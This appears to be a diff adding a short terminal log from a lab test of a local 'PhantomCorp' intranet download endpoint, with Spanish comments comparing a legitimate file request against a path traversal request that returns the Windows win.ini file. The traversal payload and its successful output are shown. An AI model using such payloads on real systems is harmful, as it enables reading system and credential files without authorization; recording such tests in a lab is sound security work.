@@ -1,0 +1,13 @@
+$ curl http://127.0.0.1:18351/descargar?archivo=manual.txt   (legitimo, para comparar)
+Manual de la intranet PhantomCorp.
+
+$ curl http://127.0.0.1:18351/descargar?archivo=../../Windows/win.ini   (traversal real, archivo que SI existe en Windows)
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+[ResponseResult]
+ResultCode=0
